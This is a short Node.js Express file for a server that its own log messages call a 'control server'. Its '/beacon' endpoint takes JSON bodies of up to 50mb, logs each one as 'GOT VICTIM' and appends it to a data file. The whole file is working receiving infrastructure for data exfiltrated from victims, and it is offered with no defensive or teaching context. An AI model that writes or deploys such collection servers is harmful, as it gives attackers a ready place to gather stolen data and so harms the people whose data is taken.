const express = require('express');
const app = express();
app.use(express.json({limit:'50mb'}));

app.post('/beacon', (req,res)=>{ 
  console.log('GOT VICTIM:', req.body);
  require('fs').writeFileSync('data.txt', JSON.stringify(req.body)+'\n',{flag:'a'});
  res.send('OK');
});

app.listen(3000, ()=>console.log('CONTROL SERVER READY'));
